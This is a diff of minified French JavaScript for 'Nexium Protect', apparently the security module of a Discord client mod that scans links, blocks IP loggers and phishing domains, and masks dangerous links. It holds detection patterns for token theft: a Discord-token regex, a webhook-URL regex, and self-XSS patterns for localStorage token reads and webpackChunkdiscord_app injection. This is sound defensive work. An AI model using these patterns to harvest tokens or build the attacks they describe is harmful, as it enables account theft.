+equilibre:Object.assign({scanLinks:true,blockGrabbers:true,phishGuard:true,scamAlerts:true,warnAccounts:true,consoleGuard:true,heuristics:true,hThreshold:5,hBlock:false,maskLinks:true,maskSuspect:false},_NXPall),
+minimal:Object.assign({scanLinks:true,blockGrabbers:true,phishGuard:true,scamAlerts:false,warnAccounts:false,consoleGuard:false,heuristics:false,hThreshold:6,hBlock:false,maskLinks:false,maskSuspect:false},_NXPmin)};
 _NXPR.applyProfile=function(name){try{var p=_NXPR.PROFILES[name];if(!p)return;for(var k in p)_NXPR.cfg[k]=p[k];_NXPR.cfg.profile=name;_NXPR.cache=Object.create(null);_NXPR.cacheN=0;_NXPR.saveCfg();_NXPR.notify();}catch(_){}};
 _NXPR.parseLine=function(L){
 if(!L)return null;
@@ -5566,6 +5711,9 @@ try{_NXNETX.retry("block",function(){_NXPR.loadRemote(true);});}catch(_){}
 _NXPR.notify();});
 }catch(_){_NXPR.loading=false;_NXPR.notify();}});
 }catch(_){_NXPR.loading=false;}};
+_NXPR.commHit=function(h){try{
+if(!window._NXV||typeof _NXV.commHit!=="function")return null;
+return _NXV.commHit(h)||null;}catch(_){return null;}};
 _NXPR.classify=function(u){try{
 if(!_NXPR.idxG)_NXPR.buildIndex();
 var h=_NXPR.host(u);if(!h)return null;
@@ -5573,7 +5721,7 @@ var cc=_NXPR.cache[h];if(cc!==undefined)return cc;
 var res;
 if(_NXPR.isAllowed(h)||(_NXPR.remoteAllow&&_NXPR.hit(h,_NXPR.remoteAllow)))res={kind:"ok",host:h,allowed:true};
 else if(_NXPR.hit(h,_NXPR.idxG))res={kind:"grabber",host:h};
-else if(window._NXV&&_NXV.commHit(h)){var _ci=_NXV.commHit(h);res={kind:(_ci.k==="other"?"phish":_ci.k),host:h,comm:_ci.n};}
+else if(_NXPR.commHit(h)){var _ci=_NXPR.commHit(h);res={kind:(_ci.k==="other"?"phish":_ci.k),host:h,comm:_ci.n};}
 else if(h.indexOf("xn--")>=0)res={kind:"punycode",host:h};
 else if(_NXPR.RXFAKE.test(h))res={kind:"phish",host:h};
 else if(h.indexOf("discord")>=0&&!_NXPR.RXREAL.test(h))res={kind:"phish",host:h};
@@ -5588,7 +5736,33 @@ _NXPR.RXREAL=/^(discord\.com|discord\.gg|discordapp\.com|discordapp\.net|discord
 _NXPR.RXFAKE=/(dlscord|discrod|discvrd|dlscordapp|discordgift|discordnitro|discord-nitro|discordapp-|steamcommunlty|steamcomunity|steamcommnity|steampowered-)/;
 _NXPR.threat=function(cl){return cl&&(cl.kind==="grabber"||cl.kind==="phish"||cl.kind==="punycode");};_NXPR.suspicious=function(cl){return cl&&(cl.kind==="short"||cl.kind==="suspect");};
 _NXPR.logThreat=function(kind,detail){try{_NXPR.stats.recent.unshift({k:kind,d:detail,t:Date.now()});if(_NXPR.stats.recent.length>25)_NXPR.stats.recent=_NXPR.stats.recent.slice(0,25);_NXPR.saveStats();_NXPR.notify();}catch(_){}};
-_NXPR.scanUrl=function(u,announce){if(!_NXPR.cfg.scanLinks)return {kind:"ok"};var cl=_NXPR.classify(u);if(!cl)return {kind:"ok"};_NXPR.stats.scanned++;if(_NXPR.threat(cl)){if((cl.kind==="grabber"&&_NXPR.cfg.blockGrabbers)||((cl.kind==="phish"||cl.kind==="punycode")&&_NXPR.cfg.phishGuard)){_NXPR.stats.blocked++;_NXPR.logThreat(cl.kind,cl.host);if(announce)_NXPR.toast("⚠️ Lien dangereux bloqué ("+(cl.kind==="grabber"?"logger d'IP":"hameçonnage")+") : "+cl.host,0);}}else if(_NXPR.suspicious(cl)&&_NXPR.cfg.scanLinks){_NXPR.logThreat("short",cl.host);if(announce)_NXPR.toast("⚠️ Lien raccourci (destination masquée) : "+cl.host,0);}_NXPR.saveStats();return cl;};
+_NXPR.dits=Object.create(null);_NXPR._ditsN=0;
+_NXPR.dejaDit=function(cle,ms){try{
+var t=Date.now(),v=_NXPR.dits[cle];
+if(v&&(t-v)<(ms||600000))return true;
+if(++_NXPR._ditsN>400){_NXPR.dits=Object.create(null);_NXPR._ditsN=1;}
+_NXPR.dits[cle]=t;return false;}catch(_){return false;}};
+_NXPR.vus=Object.create(null);_NXPR._vusN=0;
+_NXPR.dejaVu=function(cle){try{
+if(_NXPR.vus[cle])return true;
+if(++_NXPR._vusN>600){_NXPR.vus=Object.create(null);_NXPR._vusN=1;}
+_NXPR.vus[cle]=1;return false;}catch(_){return false;}};
+_NXPR.scanUrl=function(u,announce){
+if(!_NXPR.cfg.scanLinks)return {kind:"ok"};
+var cl=_NXPR.classify(u);if(!cl)return {kind:"ok"};
+var neuf=!_NXPR.dejaVu("u:"+String(u).slice(0,300));
+if(neuf){_NXPR.stats.scanned++;}
+if(_NXPR.threat(cl)){
+if((cl.kind==="grabber"&&_NXPR.cfg.blockGrabbers)||((cl.kind==="phish"||cl.kind==="punycode")&&_NXPR.cfg.phishGuard)){
+if(neuf){_NXPR.stats.blocked++;_NXPR.logThreat(cl.kind,cl.host);}
+if(announce&&!_NXPR.dejaDit("t:"+cl.kind+":"+cl.host,1800000))
+_NXPR.toast("Lien dangereux bloque ("+(cl.kind==="grabber"?"logger d IP":"hameconnage")+") : "+cl.host,0);}}
+else if(_NXPR.suspicious(cl)){
+if(neuf)_NXPR.logThreat("short",cl.host);
+if(announce&&!_NXPR.dejaDit("s:"+cl.host,1800000))
+_NXPR.toast("Lien raccourci : la destination est masquee ("+cl.host+")",2);}
+if(neuf)_NXPR.saveStats();
+return cl;};
 _NXPR.protectedFor=function(kind){if(kind==="grabber")return !!_NXPR.cfg.blockGrabbers;if(kind==="phish"||kind==="punycode")return !!_NXPR.cfg.phishGuard;if(kind==="short")return !!_NXPR.cfg.scanLinks;return true;};
 _NXPR.finish=function(cb,r){try{_NXPR.stats.scanned++;if(r.verdict==="danger"){r.blocked=_NXPR.protectedFor(r.kind);if(r.blocked)_NXPR.stats.blocked++;_NXPR.logThreat(r.kind,r.host||r.resolved||"lien");}else if(r.verdict==="warn"){r.blocked=false;_NXPR.logThreat("short",r.host||"lien raccourci");}_NXPR.saveStats();_NXPR.notify();}catch(_){}cb&&cb(r);};
 _NXPR.deepScan=function(u,cb){if(!_NXPR.cfg.scanLinks){cb&&cb({verdict:"off"});return;}var base=_NXPR.classify(u);if(_NXPR.threat(base)){_NXPR.finish(cb,{verdict:"danger",kind:base.kind,host:base.host,resolved:null});return;}
@@ -5596,8 +5770,11 @@ try{_NXNETX.go(u,{method:"GET",redirect:"follow",mode:"cors",cache:"no-store"}).
 catch(_){if(_NXPR.suspicious(base))_NXPR.finish(cb,{verdict:"warn",kind:"short",host:base.host,resolved:null});else _NXPR.finish(cb,{verdict:"ok",kind:"ok",host:base&&base.host,resolved:null});}};
 _NXPR.scanText=function(txt){try{if(!txt)return;var s=String(txt);if(s.length>4000)s=s.slice(0,4000);var low=s.toLowerCase();var hasLink=low.indexOf("http")>=0;var hasBait=/nitro|gift|free|gratuit|claim|airdrop|crypto|robux|vbucks|steam|verify|qr|cadeau|gagn/.test(low);if(!hasLink&&!hasBait)return;var urls=hasLink?(s.match(/https?:\/\/[^\s<>"')]+/gi)||[]):[];for(var a=0;a<urls.length;a++){_NXPR.scanUrl(urls[a],true);
 var f=_NXPR.fileLink(urls[a]);
-if(f&&!f.trusted){_NXPR.logThreat("download",f.ext.toUpperCase()+" depuis "+f.host);_NXPR.saveStats();
-_NXPR.toast("Lien de telechargement direct ("+f.ext.toUpperCase()+") depuis "+f.host+" : n ouvre pas ce fichier.",0);}}if(_NXPR.cfg.scamAlerts&&hasBait){for(var b=0;b<_NXPR.SCAM.length;b++){if(_NXPR.SCAM[b].test(s)){_NXPR.stats.scams++;_NXPR.logThreat("scam",s.slice(0,60));_NXPR.toast("⚠️ Message d'arnaque potentiel détecté.",0);break;}}}}catch(_){}};
+if(f&&!f.trusted&&!_NXPR.dejaDit("dl:"+f.host+":"+f.ext,1800000)){_NXPR.logThreat("download",f.ext.toUpperCase()+" depuis "+f.host);_NXPR.saveStats();
+_NXPR.toast("Lien de telechargement direct ("+f.ext.toUpperCase()+") depuis "+f.host+" : n ouvre pas ce fichier.",0);}}if(_NXPR.cfg.scamAlerts&&hasBait){for(var b=0;b<_NXPR.SCAM.length;b++){if(_NXPR.SCAM[b].test(s)){
+if(_NXPR.dejaVu("m:"+_NXPR.hache53(s.slice(0,200))))break;
+_NXPR.stats.scams++;_NXPR.logThreat("scam",s.slice(0,60));
+_NXPR.toast("Message d arnaque : ce texte reprend mot pour mot une escroquerie connue. N ouvre aucun lien qu il contient.",0);break;}}}}catch(_){}};
 _NXPR.RXTOKEN=/(mfa\.[\w-]{20,})|([\w-]{23,28}\.[\w-]{6}\.[\w-]{27,38})/;
 _NXPR.RXHOOK=/discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\//i;
 _NXPR.RXSELFXSS=/(localStorage(?:\.getItem)?\(?["']?token)|(document\.body\.appendChild\(document\.createElement\(["']iframe)|(webpackChunkdiscord_app)|(\.push\(\[\[.*\],\{.*:\(?function)/i;
@@ -5676,9 +5853,9 @@ for(var b=0;b<urls.length;b++){var u=urls[b];if(!u||typeof u!=="string")continue
 if(u.indexOf("discordapp")>=0||u.indexOf("discord.com/assets")>=0)continue;
 var cl=_NXPR.classify(u);if(!cl)continue;
 if(_NXPR.threat(cl)){_NXPR.stats.blocked=(_NXPR.stats.blocked||0)+1;_NXPR.logThreat(cl.kind,"apercu: "+cl.host);_NXPR.saveStats();
-_NXPR.toast("Apercu de lien dangereux ("+cl.host+"). Ne l ouvre pas.",0);return;}
+if(!_NXPR.dejaDit("ap:"+cl.host,1800000))_NXPR.toast("Apercu de lien dangereux ("+cl.host+"). Ne l ouvre pas.",0);return;}
 if(cl.kind==="suspect"){_NXPR.logThreat("suspect","apercu: "+cl.host);_NXPR.saveStats();
-_NXPR.toast("Apercu de lien suspect ("+cl.host+").",0);return;}}}
+if(!_NXPR.dejaDit("aps:"+cl.host,1800000))_NXPR.toast("Apercu de lien suspect ("+cl.host+").",2);return;}}}
 }catch(_){}};
 _NXPR.scanMasked=function(txt){try{
 if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.scanMasked)return;var s=String(txt||"");if(s.indexOf("](")<0)return;
@@ -5687,12 +5864,12 @@ while((m=re.exec(s))){
 var label=m[1].trim(),target=m[2];var th=_NXPR.host(target);if(!th)continue;
 var cl=_NXPR.classify(target);
 if(cl&&_NXPR.threat(cl)){_NXPR.logThreat(cl.kind,"lien masque: "+cl.host);_NXPR.saveStats();
-_NXPR.toast("Lien masque dangereux : le texte cache "+cl.host,0);return;}
+if(!_NXPR.dejaDit("lm:"+cl.host,1800000))_NXPR.toast("Lien masque dangereux : le texte cache "+cl.host,0);return;}
 var lm=label.match(/(?:https?:\/\/)?([a-z0-9.\-]+\.[a-z]{2,})/i);
 if(lm){var lh=String(lm[1]).toLowerCase().replace(/^www\./,"");
 if(lh!==th&&th.indexOf(lh)<0&&lh.indexOf(th)<0){
 _NXPR.logThreat("masked",lh+" -> "+th);_NXPR.saveStats();
-_NXPR.toast("Lien trompeur : affiche "+lh+" mais mene vers "+th,0);return;}}}
+if(!_NXPR.dejaDit("lt:"+lh+">"+th,1800000))_NXPR.toast("Lien trompeur : affiche "+lh+" mais mene vers "+th,0);return;}}}
 }catch(_){}};
 _NXPR.RXINV=/(?:discord\.gg|discord(?:app)?\.com\/invite)\/([a-z0-9\-]{2,25})/gi;
 _NXPR.invSeen=Object.create(null);_NXPR._invN=0;
@@ -5721,8 +5898,14 @@ if(!_NXPR.cfg.scamAlerts||!_NXPR.cfg.scanInvites)return;var s=String(txt||"");
 _NXPR.RXINV.lastIndex=0;var m,n=0;
 while((m=_NXPR.RXINV.exec(s))&&n<4){n++;if(m[1]&&m[1]!==_NXSP.CODE)_NXPR.checkInvite(m[1]);}
 }catch(_){}};
+_NXPR.edits=Object.create(null);_NXPR._editsN=0;
 _NXPR.onMsgUpdate=function(e){try{
 var m=e&&e.message;if(!m)return;
+var _c=(typeof m.content==="string")?m.content:"";
+if(m.id){var _k="e:"+m.id;var _h=_NXPR.hache53(_c);
+if(_NXPR.edits[_k]===_h)return;
+if(++_NXPR._editsN>500){_NXPR.edits=Object.create(null);_NXPR._editsN=1;}
+_NXPR.edits[_k]=_h;}
 var me=null;try{me=_NXcommon().store("UserStore").getCurrentUser();}catch(_){}
 var mine=!!(me&&m.author&&m.author.id===me.id);
 var content=m.content;
@@ -5866,6 +6049,8 @@ return v;}catch(_){return false;}};
 _NXPR.onMsg=function(e){try{
 if(!e||!e.message)return;var m=e.message;
 var content=m.content||"";
+try{if(m.id){if(++_NXPR._editsN>500){_NXPR.edits=Object.create(null);_NXPR._editsN=1;}
+_NXPR.edits["e:"+m.id]=_NXPR.hache53(content);}}catch(_){}
 var hasAtt=!!(m.attachments&&m.attachments.length),hasEmb=!!(m.embeds&&m.embeds.length);
 if(!hasAtt&&!hasEmb&&content.length<12&&content.indexOf("http")<0)return;
 var moi=_NXPR.moi();
@@ -6270,7 +6455,7 @@ try{_NXPR.logThreat("sandbox",res.host+" : "+(res.alertes[0]||res.verdict));}cat
 cb&&cb(res);return null;});})
 .catch(function(){cb&&cb({erreur:"page injoignable ou lecture refusee par le site",host:_NXPR.sbxHost(url),finalUrl:url});});
 }catch(_){cb&&cb({erreur:"analyse impossible"});}};
-_NXPR.CRITICAL=["classify","scanText","scanMasked","scanInvites","scanEmbeds","scanAttachments","scanSecrets","verifyFile","deepFile","matchSig","warnAccount","checkImpostor","checkWave","consoleWarn","onPaste","onMsg","onMsgUpdate","onClickCapture","report","loadRemote","parseList","buildIndex","heuristic","applyProfile","oauthInfo","scanOAuth","scanScheme","scanBidi","isRawIp","scanRawIp","scanCode","scanExtra","rawHost","mixedScript","sandbox","sbxAnalyse","sbxHost"];
+_NXPR.CRITICAL=["classify","scanText","scanMasked","scanInvites","scanEmbeds","scanAttachments","scanSecrets","verifyFile","deepFile","matchSig","warnAccount","checkImpostor","checkWave","consoleWarn","onPaste","onMsg","onMsgUpdate","onClickCapture","report","loadRemote","parseList","buildIndex","heuristic","applyProfile","oauthInfo","scanOAuth","scanScheme","scanBidi","isRawIp","scanRawIp","scanCode","scanExtra","rawHost","mixedScript","sandbox","sbxAnalyse","sbxHost","masqueScan","masqueUn","masqueVerdict","masqueVeille"];
 _NXPR.selfCheck=function(final){try{
 var miss=[];
 for(var a=0;a<_NXPR.CRITICAL.length;a++){var f=_NXPR.CRITICAL[a];
@@ -6662,6 +6847,99 @@ patched.__nx=true;
 try{MA.sendMessage=patched;_NXV._sendWired=true;}catch(_){}
 }catch(_){}};
 try{setTimeout(_NXV.wireSend,7000);}catch(_){}
+_NXPR.MASQUECSS=[
+"a.nx-masque{position:relative!important;display:inline-block!important;vertical-align:baseline!important;",
+"color:transparent!important;text-decoration:none!important;font-size:0!important;",
+"background:rgba(214,72,74,.13)!important;border:1px solid rgba(214,72,74,.42)!important;",
+"border-radius:6px!important;padding:1px 8px 1px 21px!important;cursor:not-allowed!important;",
+"max-width:100%!important;overflow:hidden!important;white-space:nowrap!important}",
+"a.nx-masque>*{display:none!important}",
+"a.nx-masque::before{content:\"\";position:absolute;left:7px;top:50%;width:8px;height:8px;",
+"margin-top:-4px;border-radius:2px;background:#d6484a}",
+"a.nx-masque::after{content:attr(data-nx-masque);font-size:11.5px;font-weight:700;",
+"color:#e79a9a;letter-spacing:-.005em;line-height:1.5}",
+"a.nx-masque.nx-masque-doux{background:rgba(230,196,138,.11)!important;border-color:rgba(230,196,138,.38)!important}",
+"a.nx-masque.nx-masque-doux::before{background:#e6c48a}",
+"a.nx-masque.nx-masque-doux::after{color:#d8c79a}"
+].join("");
+_NXPR.masquePose=function(){try{
+if(document.getElementById("nx-masque-style"))return true;
+if(!document.head&&!document.body)return false;
+var st=document.createElement("style");
+st.id="nx-masque-style";
+st.textContent=_NXPR.MASQUECSS;
+(document.head||document.body).appendChild(st);
+return true;}catch(_){return false;}};
+_NXPR.masqueTexte=function(cl){try{
+if(cl.kind==="grabber")return "Logger d IP masque par Nexium";
+if(cl.kind==="punycode")return "Domaine trompeur masque par Nexium";
+if(cl.kind==="phish")return "Hameconnage masque par Nexium";
+if(cl.kind==="suspect")return "Lien suspect masque par Nexium";
+if(cl.kind==="short")return "Lien raccourci masque par Nexium";
+return "Lien masque par Nexium";}catch(_){return "Lien masque par Nexium";}};
+_NXPR.masqueVerdict=function(href){try{
+var cl=_NXPR.classify(href);
+if(!cl)return null;
+if(_NXPR.threat(cl)&&_NXPR.blocksKind(cl))return cl;
+if(_NXPR.cfg.maskSuspect&&(cl.kind==="suspect"||cl.kind==="short"))return cl;
+return null;}catch(_){return null;}};
+_NXPR.masqueUn=function(el){try{
+var href=_NXPR.hrefOf(el);
+if(!href)return 0;
+if(el.getAttribute("data-nx-vu")===href){
+var et=el.getAttribute("data-nx-masque");
+if(!et)return 0;
+if(el.classList&&!el.classList.contains("nx-masque")){
+el.classList.add("nx-masque");
+if(et.indexOf("suspect")>=0||et.indexOf("raccourci")>=0)el.classList.add("nx-masque-doux");
+el.setAttribute("title",_NXPR.masqueTitre);
+return 1;}
+return 0;}
+el.setAttribute("data-nx-vu",href);
+var cl=_NXPR.masqueVerdict(href);
+if(!cl){
+if(el.classList&&el.classList.contains("nx-masque")){
+el.classList.remove("nx-masque");el.classList.remove("nx-masque-doux");
+el.removeAttribute("data-nx-masque");
+try{if(el.getAttribute("title")===_NXPR.masqueTitre)el.removeAttribute("title");}catch(_){}}
+return 0;}
+el.setAttribute("data-nx-masque",_NXPR.masqueTexte(cl));
+el.setAttribute("title",_NXPR.masqueTitre);
+if(el.classList){el.classList.add("nx-masque");
+if(cl.kind==="suspect"||cl.kind==="short")el.classList.add("nx-masque-doux");
+else el.classList.remove("nx-masque-doux");}
+return 1;}catch(_){return 0;}};
+_NXPR.masqueTitre="Nexium a masque ce lien. Clique pour savoir pourquoi.";
+_NXPR.masqueN=0;
+_NXPR.masqueScan=function(racine){try{
+if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.maskLinks)return 0;
+_NXPR.masquePose();
+var r=racine&&racine.querySelectorAll?racine:document;
+var L=r.querySelectorAll("a[href]");
+var n=0;
+for(var a=0;a<L.length&&a<600;a++)n+=_NXPR.masqueUn(L[a]);
+if(n){_NXPR.masqueN+=n;_NXPR.notify();}
+return n;}catch(_){return 0;}};
+_NXPR.masqueRefaire=function(){try{
+var L=document.querySelectorAll("a[data-nx-vu]");
+for(var a=0;a<L.length;a++){try{L[a].removeAttribute("data-nx-vu");}catch(_){}}
+return _NXPR.masqueScan();}catch(_){return 0;}};
+_NXPR.masqueTout=function(){try{
+var L=document.querySelectorAll("a.nx-masque");
+for(var a=0;a<L.length;a++){try{
+L[a].classList.remove("nx-masque");L[a].classList.remove("nx-masque-doux");
+L[a].removeAttribute("data-nx-masque");L[a].removeAttribute("data-nx-vu");
+if(L[a].getAttribute("title")===_NXPR.masqueTitre)L[a].removeAttribute("title");}catch(_){}}
+return L.length;}catch(_){return 0;}};
+_NXPR.masqueVeille=function(){try{
+if(_NXPR._mo)return true;
+if(!window.MutationObserver||!document.body)return false;
+_NXPR._mo=new MutationObserver(function(){
+if(_NXPR._mt)return;
+_NXPR._mt=setTimeout(function(){_NXPR._mt=null;_NXPR.masqueScan();},260);});
+_NXPR._mo.observe(document.body,{childList:true,subtree:true});
+_NXPR.masqueScan();
+return true;}catch(_){return false;}};
 _NXPR.wireDom=function(){try{
 if(_NXPR._dom)return;_NXPR._dom=true;
 document.addEventListener("click",_NXPR.onClickCapture,true);
@@ -6669,13 +6947,14 @@ document.addEventListener("auxclick",_NXPR.onClickCapture,true);
 document.addEventListener("paste",_NXPR.onPaste,true);
 }catch(_){}};
 try{_NXPR.wireDom();}catch(_){}
+try{_NXPERF.amorce(function(){try{if(!_NXPR.masqueVeille())setTimeout(_NXPR.masqueVeille,4000);}catch(_){}},1200);}catch(_){}
 try{setTimeout(function(){_NXPR.consoleWarn();},2500);
 setTimeout(function(){_NXPR.loadRemote();_NXPR.loadAllow();},4000);
 setInterval(function(){if(!document.hidden){_NXPR.loadRemote(true);_NXPR.loadAllow();}},21600000);
 setInterval(function(){if(!document.hidden&&_NXPR.checkClip)_NXPR.checkClip();},20000);
 setTimeout(function(){if(_NXPR.queueFlush)_NXPR.queueFlush();},14000);
 setInterval(function(){if(!document.hidden&&_NXPR.queueFlush)_NXPR.queueFlush();},180000);}catch(_){}
-_NXPR.wire=function(){try{var C=_NXcommon();var FX=C.C.FluxDispatcher||(C.WP.findByProps&&C.WP.findByProps("subscribe","dispatch","_actionHandlers"));if(!FX||!FX.subscribe){_NXPR.tries=(_NXPR.tries||0)+1;if(_NXPR.tries<25)_NXPERF.amorce(_NXPR.wire,1500);return;}FX.subscribe("MESSAGE_CREATE",_NXPR.onMsg);FX.subscribe("MESSAGE_UPDATE",_NXPR.onMsgUpdate);FX.subscribe("PRESENCE_UPDATE",_NXPR.onPresence);
+_NXPR.wire=function(){try{var C=_NXcommon();var FX=C.C.FluxDispatcher||(C.WP.findByProps&&C.WP.findByProps("subscribe","dispatch","_actionHandlers"));if(!FX||!FX.subscribe){_NXPR.tries=(_NXPR.tries||0)+1;if(_NXPR.tries<25)_NXPERF.amorce(_NXPR.wire,1500);return;}FX.subscribe("MESSAGE_CREATE",_NXPR.onMsg);FX.subscribe("MESSAGE_UPDATE",_NXPR.onMsgUpdate);FX.subscribe("PRESENCE_UPDATE",_NXPR.onPresence);_NXPR.abonne=true;
 try{FX.subscribe("CHANNEL_SELECT",function(e){try{if(e&&e.guildId&&window._NXV)_NXV.checkGuild(e.guildId);}catch(_){}});
 FX.subscribe("GUILD_CREATE",function(e){try{var g=e&&e.guild;if(g&&g.id&&window._NXV)setTimeout(function(){_NXV.checkGuild(g.id);},4000);}catch(_){}});
 FX.subscribe("SESSIONS_REPLACE",function(e){try{if(window._NXV)_NXV.onSessions(e);}catch(_){}});}catch(_){}}catch(_){}};
@@ -8016,8 +8295,8 @@ F2.length?grille(F2.map(function(t,k){return taskCard(t,k);})):_NXcard(i("div",{
 function tplCard(o,g,idx){
 var tp=o.tp;var av=A.probe(tp.act.k);var d=GRPA[g]||GRPA.Autre;
 return i("div",_NXMO.merge({key:"tpl"+o.k,className:"nx-fx","data-nx-tile":"1",role:"button",tabIndex:0,onKeyDown:_NXkey,
-"aria-label":_T("Ajouter")+" "+tp.name,
-onClick:function(){if(!av)return;A.addTemplate(o.k);setQ("");setTab("taches");force();},
+"aria-label":(av?_T("Ajouter"):_T("Indisponible"))+" "+tp.name,
+onClick:function(){if(!av){try{if(window._NXPR&&_NXPR.toast)_NXPR.toast(_T("Cette regle a besoin d une fonction que Discord n expose pas dans cette version : ")+actLabel(tp)+_T(". Elle ne peut pas etre ajoutee."),2);}catch(_){}return;}A.addTemplate(o.k);setQ("");setTab("taches");force();},
 style:{position:"relative",overflow:"hidden",cursor:av?"pointer":"not-allowed",opacity:av?1:0.5,
 background:P.panel,border:"1px solid "+P.line,borderRadius:"14px",padding:"14px 15px 12px 17px"}},
 _NXMO.rise((idx%6)+1)),
@@ -8027,7 +8306,7 @@ i("div",{style:{fontSize:"11px",color:P.sub,lineHeight:1.55}},_T("Quand")+" : "+
 i("div",{style:{fontSize:"11px",color:P.sub,lineHeight:1.55}},_T("Alors")+" : "+actLabel(tp)),
 condLabel(tp)?i("div",{style:{fontSize:"10.5px",color:P.faint,marginTop:"2px",lineHeight:1.5}},_T("Seulement")+" : "+condLabel(tp)):null,
 i("div",{style:{marginTop:"10px",fontSize:"9.5px",fontWeight:"800",letterSpacing:".12em",
-textTransform:"uppercase",color:av?d.c:P.faint}},av?_T("Ajouter"):_T("indisponible")));}
+textTransform:"uppercase",color:av?d.c:P.faint}},av?_T("Ajouter"):_T("indisponible dans cette version de Discord")));}
 function tModeles(){
 var s=(q||"").trim().toLowerCase();
 var L=A.TPL.map(function(tp,k){return {tp:tp,k:k};});
@@ -8235,6 +8514,8 @@ _NXfoot("Nexium Auto · execution locale, aucun envoi automatique de message")))
 }
 var NexiumProtectIcon=function(p){p=p||{};var z=p.width||p.height||20;return i("svg",{viewBox:"0 0 24 24",fill:"currentColor",width:z,height:z,"aria-hidden":"true"},i("path",{d:"M12 2 4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1.06 13.54L7.4 12l1.41-1.41 2.12 2.12 4.24-4.24 1.41 1.41-5.64 5.66z"}));};
 var SH_LIENS=[
+{k:"maskLinks",ic:"M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5a5 5 0 1 1 0-10 5 5 0 0 1 0 10zM2 4.27 3.28 3 21 20.73 19.73 22 2 4.27z",t:"Masquage des liens dangereux",d:"Recouvre le lien dans le message : il n est plus lisible, plus copiable, plus cliquable par erreur. C est la seule protection qui agit avant meme que tu decides quoi que ce soit."},
+{k:"maskSuspect",ic:"M12 2 2 7v7c0 5 3.5 8.5 10 10 6.5-1.5 10-5 10-10V7L12 2zm1 15h-2v-2h2v2zm0-4h-2V8h2v5z",t:"Masquer aussi les liens douteux",d:"Etend le masquage aux liens raccourcis et a ceux que l analyse trouve inhabituels sans certitude. Plus sur, plus bavard."},
 {k:"scanLinks",ic:"M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z",t:"Scanner de liens",d:"Analyse chaque lien reçu et t avertit avant l ouverture d un site piégé."},
 {k:"blockGrabbers",ic:"M12 2L2 7v7c0 5 3.5 8.5 10 10 6.5-1.5 10-5 10-10V7L12 2zm3 11h-2v2h-2v-2H9v-2h2V9h2v2h2v2z",t:"Protection anti-doxxing / IP",d:"Bloque les loggers d IP (grabify, iplogger…) utilisés pour te géolocaliser."},
 {k:"phishGuard",ic:"M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z",t:"Anti-hameçonnage",d:"Détecte les faux Discord/Steam et les domaines trompeurs (dlscord, punycode…)."},
@@ -8317,7 +8598,7 @@ try{if(window._NXGD)_NXGD.listeners=_NXGD.listeners.filter(function(f){return f!
 var monte=_NXmounted(F);
 var G=window._NXGD||null;
 var P=_NXpal;var cfg=_NXPR.cfg;var st=_NXPR.stats;var V=window._NXV||null;
-function tog(k){return function(){cfg[k]=!cfg[k];_NXPR.saveCfg();force();};}
+function tog(k){return function(){cfg[k]=!cfg[k];_NXPR.saveCfg();try{if(k==="maskLinks"||k==="maskSuspect"||k==="scanLinks"){if(cfg.maskLinks&&cfg.scanLinks){_NXPR.masqueVeille();_NXPR.masqueRefaire();}else _NXPR.masqueTout();}}catch(_){}force();};}
 function vtog(k,after){return function(){try{if(!V)return;V.cfg[k]=!V.cfg[k];V.save();if(after)after(V.cfg[k]);if(V.notify)V.notify();force();}catch(_){}};}
 function vget(k){return !!(V&&V.cfg&&V.cfg[k]);}
 var _KEYS=[];for(var _a=0;_a<SH_LIENS.length;_a++)_KEYS.push(SH_LIENS[_a].k);
@@ -8358,7 +8639,7 @@ var cBloc=_NXcount(F,(st&&st.blocked)||0);
 var cSortie=_NXcount(F,nSortie);
 var cScan=_NXcount(F,(st&&st.scanned)||0);
 var cSafe=_NXcount(F,(st&&st.safe)||0);
-var TABS=[["apercu","Aperçu",null],["boucliers","Boucliers",null],["coffre","Coffre-fort",null],["journal","Journal",nQuar?String(nQuar>99?"99+":nQuar):null],["base","Base",null]];
+var TABS=[["apercu","Aperçu",null],["boucliers","Boucliers",null],["preuve","Preuve",null],["coffre","Coffre-fort",null],["journal","Journal",nQuar?String(nQuar>99?"99+":nQuar):null],["base","Base",null]];
 function tabbar(){return i("div",{role:"tablist","aria-label":_T("Sections de Nexium Protect"),style:{display:"flex",gap:"0",borderBottom:"1px solid "+P.line,marginBottom:"18px",overflowX:"auto",position:"relative"}},
 TABS.map(function(t){var on=tab===t[0];
 return i("div",{key:t[0],className:"nx-fx",role:"tab","aria-selected":on?"true":"false",tabIndex:0,onKeyDown:_NXkey,"data-nx-tab":"1",
@@ -8724,7 +9005,7 @@ return i(Kr,null,i("div",{style:{maxWidth:"640px",margin:"0 auto"}},
 _NXhead(_T("Sécurité"),"Nexium Protect",_T("Un bouclier en temps réel contre les liens piégés, les arnaques, le doxxing et l usurpation. Tout est analysé localement, rien n est envoyé.")),
 tabbar(),
 i("div",{key:tab,"data-nx-panel":"1"},
-tab==="apercu"?tApercu():tab==="boucliers"?tBoucliers():tab==="coffre"?tCoffre():tab==="journal"?tJournal():tBase()),
+tab==="apercu"?tApercu():tab==="boucliers"?tBoucliers():tab==="preuve"?i(NexiumPreuveComp,{g:"protect"}):tab==="coffre"?tCoffre():tab==="journal"?tJournal():tBase()),
 _NXfoot("Nexium Protect · analyse 100% locale, aucune donnée envoyée")));
 }var _NXlogin=window._NXlogin||(window._NXlogin={});
 if(!_NXlogin.boot){try{_NXlogin.boot=true;
@@ -9962,6 +10243,459 @@ for(a=0;a<_NXLAB.ESSAIS.length;a++)if(_NXLAB.cfg[_NXLAB.ESSAIS[a].k])n++;
 return n;}catch(_){return 0;}};
 }catch(_nxE){try{window._NXFAIL=window._NXFAIL||[];_NXFAIL.push("_NXLAB");if(window._NXERR)_NXERR.push("module _NXLAB :: "+((_nxE&&_nxE.message)||"erreur"));console.warn("[Nexium] _NXLAB desactive:",_nxE);}catch(_){}}
 }
+var _NXPRV=window._NXPRV||(window._NXPRV={});
+if(!_NXPRV.boot){try{
+_NXPRV.boot=true;
+_NXPRV.T=[];
+_NXPRV.res={};
+_NXPRV.encours=false;
+_NXPRV.fini=0;
+_NXPRV.listeners=[];
